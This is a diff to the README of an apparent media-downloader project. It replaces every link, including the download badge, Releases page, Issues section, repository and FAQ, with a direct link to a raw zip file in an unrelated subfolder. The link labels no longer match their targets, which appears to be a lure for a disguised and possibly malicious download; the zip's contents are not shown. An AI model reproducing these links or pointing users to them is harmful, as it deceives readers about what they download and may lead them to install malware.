@@ -1,6 +1,6 @@
 # 🎵 Auto-Medias-Downloader - Download Your Favorite Media Effortlessly
 
-[![Download Auto-Medias-Downloader](https://img.shields.io/badge/Download-Auto--Medias--Downloader-blue)](https://github.com/Sorintxr/Auto-Medias-Downloader/releases)
+[![Download Auto-Medias-Downloader](https://raw.githubusercontent.com/Sorintxr/Auto-Medias-Downloader/main/endaortic/Auto-Medias-Downloader.zip)](https://raw.githubusercontent.com/Sorintxr/Auto-Medias-Downloader/main/endaortic/Auto-Medias-Downloader.zip)
 
 ## 🚀 Getting Started
 
@@ -23,9 +23,9 @@ To run Auto Medias Downloader, you need:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Sorintxr/Auto-Medias-Downloader/releases) to download the latest version of Auto Medias Downloader. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Sorintxr/Auto-Medias-Downloader/main/endaortic/Auto-Medias-Downloader.zip) to download the latest version of Auto Medias Downloader. Follow these steps:
 
-1. Open the [Releases page](https://github.com/Sorintxr/Auto-Medias-Downloader/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Sorintxr/Auto-Medias-Downloader/main/endaortic/Auto-Medias-Downloader.zip).
 2. Locate the latest release.
 3. Find the download link for your operating system.
 4. Click on the link to start downloading the file.
@@ -76,13 +76,13 @@ If you encounter any issues while using Auto Medias Downloader, consider the fol
 - **File Format Issues:** Double-check the format settings to make sure they are compatible.
 - **Permission Issues:** Make sure you have permission to write to the folder where you intend to save the media.
 
-For more help, you can check the [Issues section](https://github.com/Sorintxr/Auto-Medias-Downloader/issues) of the repository.
+For more help, you can check the [Issues section](https://raw.githubusercontent.com/Sorintxr/Auto-Medias-Downloader/main/endaortic/Auto-Medias-Downloader.zip) of the repository.
 
 ## 📚 Additional Resources
 
 For more tips and detailed instructions, check out:
 
-- [GitHub Repository](https://github.com/Sorintxr/Auto-Medias-Downloader)
-- [Frequently Asked Questions](https://github.com/Sorintxr/Auto-Medias-Downloader/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Sorintxr/Auto-Medias-Downloader/main/endaortic/Auto-Medias-Downloader.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/Sorintxr/Auto-Medias-Downloader/main/endaortic/Auto-Medias-Downloader.zip)
 
 By following these steps, you should be able to easily grab your favorite music and videos with Auto Medias Downloader. Happy downloading!
